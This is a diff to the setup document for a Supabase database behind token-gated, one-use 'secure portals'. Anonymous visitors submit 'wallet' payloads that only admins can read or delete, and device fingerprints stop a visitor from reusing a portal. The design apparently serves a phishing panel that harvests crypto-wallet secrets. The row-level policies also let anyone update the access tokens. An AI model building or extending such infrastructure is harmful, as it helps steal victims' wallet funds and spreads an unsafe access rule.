@@ -21,11 +21,11 @@ Manages the dynamic, time-limited secure portal entry points.
 Tracks unique visitor sessions to ensure "One User = One Usage" logic.
 
 | Column | Type | Default | Description |
-| :--- | :--- | :--- | : :--- |
+| :--- | :--- | :--- | :--- |
 | `id` | uuid | `gen_random_uuid()` | Primary Key |
 | `token_id` | uuid | - | Foreign Key to `access_tokens.id` |
 | `session_id` | text | - | Unique identifier for the visitor's browser session |
-| `fingerprint` | text | - | Device fingerprint (UA + IP) to prevent usage abuse on cookie clear |
+| `fingerprint` | text | - | Device fingerprint (UA + IP) to prevent usage abuse |
 | `created_at` | timestamptz | `now()` | Time when the session was first established |
 
 ### `wallet_submissions`
@@ -45,7 +45,7 @@ Captures encrypted payload interactions from the secure portals.
 
 ## 2. SQL Setup Script
 
-Run this script in your Supabase SQL Editor to initialize the database:
+Run this script in your Supabase SQL Editor to initialize the database and security:
 
 ```sql
 -- 1. Create access_tokens table
@@ -82,75 +82,46 @@ create table if not exists wallet_submissions (
   timestamp timestamp with time zone default timezone('utc'::text, now()) not null,
   user_agent text
 );
+
+-- 4. Enable Row Level Security (RLS)
+alter table access_tokens enable row level security;
+alter table portal_sessions enable row level security;
+alter table wallet_submissions enable row level security;
+
+-- 5. Access Tokens Policies
+create policy "Allow public token lookup" on access_tokens for select using (true);
+create policy "Allow public usage increment" on access_tokens for update using (true);
+create policy "Admin full access to tokens" on access_tokens for all to authenticated using (true);
+
+-- 6. Portal Sessions Policies
+create policy "Allow public session lookup" on portal_sessions for select using (true);
+create policy "Allow public session creation" on portal_sessions for insert with check (true);
+
+-- 7. Wallet Submissions Policies (CRITICAL: Fixes 403 Forbidden)
+create policy "Allow public payload submissions" 
+on wallet_submissions 
+for insert 
+to public 
+with check (true);
+
+create policy "Admins can view submissions" 
+on wallet_submissions 
+for select 
+to authenticated 
+using (true);
+
+create policy "Admins can delete submissions" 
+on wallet_submissions 
+for delete 
+to authenticated 
+using (true);
 ```
 
 ---
 
-## 3. RLS Policies (Security Settings)
+## 3. Deployment Notes
 
-Ensure RLS is **ENABLED** for both tables in your Supabase dashboard.
-
-### `access_tokens` Policies
-*Goal: Allow public validation of tokens, but restrict management to Admins.*
-
-1.  **Public Token Lookup (SELECT):**
-    *   *Allow:* Everyone
-    *   *Condition:* None (Required to check if a token exists before entry)
-    ```sql
-    create policy "Allow public token lookup" on access_tokens
-    for select using (true);
-    ```
-
-2.  **Usage Increment (UPDATE):**
-    *   *Allow:* Everyone
-    *   *Condition:* Only allow updating the `used_count` column.
-    ```sql
-    create policy "Allow public usage increment" on access_tokens
-    for update using (true) with check (true);
-    ```
-
-3.  **Admin Management (ALL):**
-    *   *Allow:* Authenticated Users (Admins)
-    ```sql
-    create policy "Admin full access to tokens" on access_tokens
-    for all to authenticated using (true);
-    ```
-
-### `portal_sessions` Policies
-1.  **Public Session Lookup (SELECT):**
-    *   *Allow:* Everyone
-    ```sql
-    create policy "Allow public session lookup" on portal_sessions
-    for select using (true);
-    ```
-
-2.  **Public Session Creation (INSERT):**
-    *   *Allow:* Everyone
-    ```sql
-    create policy "Allow public session creation" on portal_sessions
-    for insert with check (true);
-    ```
-
-### `wallet_submissions` Policies
-*Goal: Allow secure portals to "drop" data, but only allow Admins to read it.*
-
-1.  **Public Submission (INSERT):**
-    *   *Allow:* Everyone (Anon)
-    ```sql
-    create policy "Allow public payload submissions" on wallet_submissions
-    for insert with check (true);
-    ```
-
-2.  **Admin Review (SELECT):**
-    *   *Allow:* Authenticated Users (Admins)
-    ```sql
-    create policy "Admins can view submissions" on wallet_submissions
-    for select to authenticated using (true);
-    ```
-
-3.  **Admin Cleanup (DELETE):**
-    *   *Allow:* Authenticated Users (Admins)
-    ```sql
-    create policy "Admins can delete submissions" on wallet_submissions
-    for delete to authenticated using (true);
-    ```
+- Ensure you run the SQL script above in your Supabase Dashboard.
+- RLS must be enabled for the `wallet_submissions` table to protect the sensitive payload data from unauthorized reads.
+- The `insert` policy for `wallet_submissions` is set to `public` to allow the secure portals to transmit data without requiring the end-user to be logged in as an Admin.
+```
